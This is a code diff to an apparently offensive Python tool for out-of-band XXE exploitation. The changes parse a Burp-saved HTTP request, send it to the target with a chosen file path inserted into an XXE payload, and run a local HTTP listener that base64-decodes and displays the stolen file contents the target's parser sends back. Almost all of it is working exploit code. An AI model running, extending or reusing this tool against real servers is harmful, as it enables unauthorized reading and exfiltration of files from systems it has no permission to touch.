@@ -5,6 +5,7 @@ import http.server
 from base64 import b64decode
 from urllib.parse import urlparse, parse_qs
 
+import requests
 from rich.console import Console
 from rich.panel import Panel
 from rich.text import Text
@@ -12,6 +13,8 @@ from rich.text import Text
 console = Console()
 
 payload = "Dummy string"
+decoded = "Dummy string"
+REQ_FILE = "xxe.req"
 
 # Some XML parsers resolve the OOB parameter entity twice for a single
 # request (once loading the DTD, once expanding it), producing two
@@ -19,8 +22,49 @@ payload = "Dummy string"
 DEDUPE_WINDOW = 2  # seconds
 _seen_content: dict[str, float] = {}
 
-# TODO To parse the .req file, and then get the relevant data and make the request
 # TODO Add argparse to get the .req filename dynamically, and also the attacker's IP and port for the OOB request
+
+
+def load_request(path=REQ_FILE):
+    """Parse a raw HTTP request (as saved by Burp) into method/target/headers/body."""
+    with open(path) as f:
+        raw = f.read()
+
+    header, body = raw.split("\n\n")
+
+    header = header.split("\n")
+
+    method, target, _ = header[0].split(" ")
+
+    headers = {}
+
+    for line in header[1:]:
+        key, _, value = line.partition(":")
+        headers[key.strip()] = value.strip()
+
+    return method, target, headers, body
+
+
+def send_request():
+    """Fire the parsed .req against its target host, triggering the OOB fetch."""
+    method, target, headers, body = load_request()
+
+    host = headers.pop("Host")
+    headers.pop("Content-Length", None)
+    scheme = "https" if headers.get("Origin", "").startswith("https") else "http"
+    url = f"{scheme}://{host}{target}"
+
+    try:
+        resp = requests.request(method, url, headers=headers, data=body, timeout=10)
+        console.print(
+            f"[cyan]Sending request to[/cyan] {url} [cyan]->[/cyan]{resp.status_code} "
+        )
+        console.print(
+            Panel(Text(decoded), title="Decoded Content", border_style="green")
+        )
+        console.print(terminal.prompt, end="", highlight=False)
+    except requests.RequestException as exc:
+        console.print(f"[red]Request failed:[/red] {exc}")
 
 
 class RequestHandler(http.server.BaseHTTPRequestHandler):
@@ -43,6 +87,7 @@ class RequestHandler(http.server.BaseHTTPRequestHandler):
             return
 
         elif "content" in self.path:
+            global decoded
             parsed = urlparse(self.path)
             params = parse_qs(parsed.query)
 
@@ -54,11 +99,6 @@ class RequestHandler(http.server.BaseHTTPRequestHandler):
                 return
 
             decoded = b64decode(b64_value).decode()
-            print()
-            console.print(
-                Panel(Text(decoded), title="Decoded Content", border_style="green")
-            )
-            console.print(terminal.prompt, end="", highlight=False)
             return
         else:
             console.print(f"[yellow]Unintended request:[/yellow] {self.path}")
@@ -77,8 +117,8 @@ class Terminal(Cmd):
             temp_payload = f.read().replace("{line}", line)
 
         payload = temp_payload
-        # TODO To make the request from here itself, instead of burp
         console.print(f"[cyan]Target file set:[/cyan] {line}")
+        send_request()
 
     def do_exit(self, arg):
         exit()
